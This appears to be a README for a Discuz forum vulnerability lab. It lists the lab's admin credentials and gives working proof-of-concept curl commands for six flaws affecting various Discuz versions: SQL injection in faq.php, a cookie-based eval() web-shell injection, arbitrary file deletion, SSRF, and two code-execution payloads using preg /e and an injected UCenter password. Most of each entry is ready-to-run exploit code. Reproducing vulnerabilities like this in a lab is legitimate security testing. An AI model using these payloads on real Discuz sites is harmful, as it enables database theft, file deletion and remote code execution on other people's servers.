## 环境说明

* src/discuz/x3.1
  * 后台地址http://127.0.0.1/admin.php
  * 管理员账号admin/admin
  * 测试账号test/123456
  * 更新日期20150609
* src/discuz/x3.0
  - 后台地址http://127.0.0.1/admin.php
  - 管理员账号admin/admin
  - 更新日期20130511

## faq.php gids 报错注入

测试镜像

* src/discuz/7.2/

影响版本 

* <= 7.2

参考链接

* [Discuz!7.2 faq.php文件SQL注入漏洞分析及利用实战](http://blog.51cto.com/simeon/1440000)

Poc

```
curl -g '127.0.0.1/faq.php?action=grouppermission&gids[99]=%27&gids[100][0]=%29%20and%20%28select%201%20from%20%28select%20count%28*%29,concat%28user%28%29,floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29%23'
```

## Discuz! 6.x/7.x 全局变量防御绕过漏洞

测试镜像

* src/discuz/7.2/

影响版本

* 6.X
* 7.X

参考链接

* [Discuz! 6.x/7.x 全局变量防御绕过导致命令执行](https://www.secpulse.com/archives/2338.html)

Poc - 替换帖子为正确地址

```
curl '127.0.0.1/viewthread.php?tid=13&extra=page%3D1' -H 'Cookie: GLOBALS[_DCACHE][smilies][searcharray] = /.*/eui; GLOBALS[_DCACHE][smilies][replacearray] = eval%28%24_POST%5BMH%5D%29%3B' -d 'MH=die(md5(1));'
```

## birthprovince 任意文件删除

测试镜像

* src/discuz/x3.2/

影响版本 

* <= X3.2

参考链接

* [Discuz!X前台任意文件删除漏洞重现及分析](http://www.freebuf.com/vuls/149904.html)

Poc

```
设置要删除的文件
curl 'http://127.0.0.1/home.php?mod=spacecp&ac=profile&op=base' -d 'birthprovince=../../../hello.txt&profilesubmit=1&formhash=...' -H 'Cookie: ...''

触发漏洞
curl 'http://127.0.0.1/home.php?mod=spacecp&ac=profile&op=base' -F 'profilesubmit=1' -F 'formhash=...' -F birthprovince=@1.jpg -H 'Cookie: ...'
```



## Discuz X门户文章功能SSRF漏洞

测试镜像

- src/discuz/x3.1

影响版本 

- Discuz X系列 <= X3.1

参考链接

- [Discuz X系列门户文章功能SSRF漏洞挖掘与分析](https://www.anquanke.com/post/id/84000)

Poc

使用测试账号test/123456登陆首页，访问url

```
http://172.17.0.2/forum.php?mod=redirect&goto=findpost&modthreadkey=1&ptid=1&pid=1
```

在跳转后的页面URL：

```
http://172.17.0.2/forum.php?mod=viewthread&tid=1&page=1&modthreadkey=c3564b479d72b05e136e62e2af4762c4#pid1
```

包含modthreadkey参数，在跳转后的页面源码中包含formhash参数，

```html
<input type="hidden" name="formhash" value="7d96833f" />
```

从控制台查看network获取当前cookie，构造SSRF触发链接

```
curl --cookie "获取的cookie" -d "a=a" "http://172.17.0.2/portal.php?mod=portalcp&ac=upload&aid=1&catid=1&op=downremotefile&formhash=7d96833f&modarticlekey=c3564b479d72b05e136e62e2af4762c4&content=%3Cimg%20src=http://172.17.0.1/test_ssrf%231.png%3E
```

其中参数formhash为页面源码中获取的formhash，modarticlekey为跳转链接中的modthreadkey参数，172.17.0.1为SSRF请求的目标机器IP，在该机器上监听80端口，执行以上curl即可触发SSRF



## Discuz X后台任意代码执行漏洞

测试镜像

- src/discuz/x3.1

影响版本 

- Discuz X系列 <= X3.3

参考链接

- [Discuz X3.3补丁安全分析](https://www.anquanke.com/post/id/86679)

Poc

使用管理员账号登录后台，在 站长->UCenter设置 页面 修改UCenter 数据库账号为shell-test 密码为 123');phpinfo();//  （该账号已预先添加至测试环境），提交后刷新该设置页面即可。



## Discuz X已知UCenter app_key代码执行漏洞

测试镜像

- src/discuz/x3.0

影响版本 

- Discuz X系列

参考链接

- [Discuz! X系列远程代码执行漏洞分析](https://www.secpulse.com/archives/35819.html)

Poc

（环境已修改api/uc.php用于生成app_key加密数据）

访问包含formhash的页面，获取其中的formhash的value值:

```
curl -c cookie.txt "http://172.17.0.2/forum.php" | grep 'formhash" value'
```

访问加密页面获取code:

```
curl "http://172.17.0.2/api/uc.php?encode=1" 
```

通过获取到的变量formhash和code构造并访问链接：

```
curl -X POST -b cookie.txt --data-raw "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>
<root>
    <item id=\"balabala\">
        <item id=\"findpattern\">/.*/e</item>
        <item id=\"replacement\">phpinfo();</item>
    </item>
</root>" "http://172.17.0.2/api/uc.php?formhash=dcac5793&code=0a54WTlZk7uY1TIjIKkpC7bkLgwxnAqnylWAKYTqnbWg0NGt20SBEAeKq6ibWeV81M2MHYFj%2FAd1t3hwZSc64hyG" && rm -f cookie.txt
```

使用管理员账号登录后台，在 用户->添加用户 页面添加任意用户触发命令执行